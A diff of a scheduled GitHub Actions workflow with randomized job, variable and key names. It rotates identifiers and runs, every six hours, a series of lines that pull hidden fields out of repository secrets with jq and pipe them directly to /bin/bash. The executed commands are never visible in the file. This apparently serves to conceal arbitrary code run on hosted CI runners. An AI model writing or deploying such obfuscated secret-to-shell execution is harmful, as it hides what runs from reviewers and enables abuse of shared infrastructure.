@@ -1,27 +1,26 @@
 name: chaiyouge1940
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 1/6 * * *'
-jobs:  # 30464
+    - cron: '7 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: chaiyouge1940
         env:
-          jrsn093: ${{ secrets.jrsn093 }}
+          risd1: ${{ secrets.risd1 }}
         run: |
-          echo $jrsn093 | jq -r .j45 | /bin/bash
-          echo $r5 | jq -r .ba123 | /bin/bash
-          echo $fq18058 | jq -r .k13003 | /bin/bash
-          echo $dvry6 | jq -r .m12907 | /bin/bash
-          echo $v6 | jq -r .alguz1 | /bin/bash
-          echo $dii6971 | jq -r .rxq97092 | /bin/bash
-          echo $ni4 | jq -r .qe08 | /bin/bash
-          echo $khiwg9 | jq -r .fgq014 | /bin/bash
-          echo $gwtu86532 | jq -r .l0814 | /bin/bash
-          echo $qg285 | jq -r .i3 | /bin/bash
-          echo $tl8 | jq -r .nl9983 | /bin/bash
-          echo $c29 | jq -r .amdsj17592 | /bin/bash
+          echo $risd1 | jq -r .q357 | /bin/bash
+          echo $pxw27190 | jq -r .dvhsd678 | /bin/bash
+          echo $fxac04 | jq -r .jkxzf24 | /bin/bash
+          echo $ownin27 | jq -r .rcca1177 | /bin/bash
+          echo $mgkx61119 | jq -r .r88903 | /bin/bash
+          echo $ehjo82394 | jq -r .wup78 | /bin/bash
+          echo $xmj66280 | jq -r .l213 | /bin/bash
+          echo $bwd33577 | jq -r .z353 | /bin/bash
 
